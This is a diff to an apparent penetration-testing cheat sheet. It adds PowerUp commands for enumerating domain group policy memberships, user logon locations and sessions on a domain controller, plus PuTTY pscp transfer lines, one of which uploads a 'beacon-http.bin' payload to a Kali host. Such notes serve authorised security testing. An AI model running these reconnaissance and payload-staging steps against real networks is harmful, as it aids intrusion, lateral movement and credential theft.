@@ -355,6 +355,14 @@ PHP:
    `([System.DirectoryServices.ActiveDirectory.Forest]::Getcurrentforest()).GlobalCatalogs`  
 - User Enumeration  
    https://github.com/sensepost/UserEnum
+- Return all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences. (Using PowerUp)   
+  `Get-DomainGPOLocalGroup`   
+- Enumerate the machines where a specific domain user/group is a member of a specific local group. (Using PowerUp)
+  `powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators`   
+- Find domain machines were specific users are logged into. (Using PowerUp)   
+  `Find-DomainUserLocation`   
+- Query Session information of a remote (or local) computer. (Using PowerUp)
+  `Get-NetSession -ComputerName dc1`   
 
 ### Network
 - run wireshark, save dump --> `./Pcredz -f dump.pcap`  
@@ -409,9 +417,13 @@ PHP:
 ### Download with SCP
 - when having SSH key to remote target, download file with:  
   `scp -i mysshprivatekey user@10.10.10.10:/home/myuser/filename /home/folder/targetfilename`  
+- From Windows using Putty: (using user root on the target vm "kali" to download the file /tmp/file.bin to the current dir on Windows)   
+  `pscp root@kali:/tmp/file.bin .`   
 
 ### Upload  
   `# scp -r localfolder/ user@remotehost:/targetdir/`   
+ - On Windows using Putty:   
+  `C:\Payloads>pscp beacon-http.bin root@kali:/tmp/beacon.bin`
 
 ### SSH copy
 - file: `scp -p 192.168.1.100:/root/filetocopy targetfile` 
